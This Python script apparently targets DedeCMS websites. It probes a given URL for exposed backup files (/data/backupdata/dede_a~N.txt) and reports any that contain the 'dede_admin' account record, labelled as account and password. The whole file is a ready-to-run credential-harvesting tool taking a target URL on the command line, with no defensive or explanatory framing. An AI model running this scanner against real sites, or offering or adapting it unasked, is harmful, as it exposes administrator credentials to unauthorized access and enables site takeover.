#coding=utf-8
import requests
import time
import sys
def getpass(url):
    for num in range(1,5):
      try:
        url2=url.strip()+"/data/backupdata/dede_a~{0}.txt".format(str(num))
        res=requests.get(url2,timeout=3)
        if res.status_code==200 and "dede_" in res.text:
           if len(res.text)>1000:
               pass
           else:
               if "dede_admin" in res.text:
                    print("账户密码: ",url2)
                    break
        else:
             break
      except:
          print("请检查网络")
if __name__=="__main__":
     if (len(sys.argv)==2):
      getpass(sys.argv[1])
     else:
      exit("use python dede.py http://example.com")
